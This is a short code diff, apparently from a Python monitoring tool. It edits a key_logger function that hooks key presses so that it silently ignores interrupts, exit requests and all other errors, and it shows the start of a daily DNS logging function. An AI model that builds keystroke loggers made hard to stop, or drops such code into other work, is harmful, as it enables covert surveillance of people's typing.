@@ -38,8 +38,10 @@ def key_logger():
     keyboard.on_press(on_key_press)
     try:
         keyboard.wait()
+    except (KeyboardInterrupt, SystemExit):
+        pass
     except Exception:
-        sys.exit(0)
+        pass
 
 def dns_logger():
     log_filename = get_daily_log_filename("dnslog")
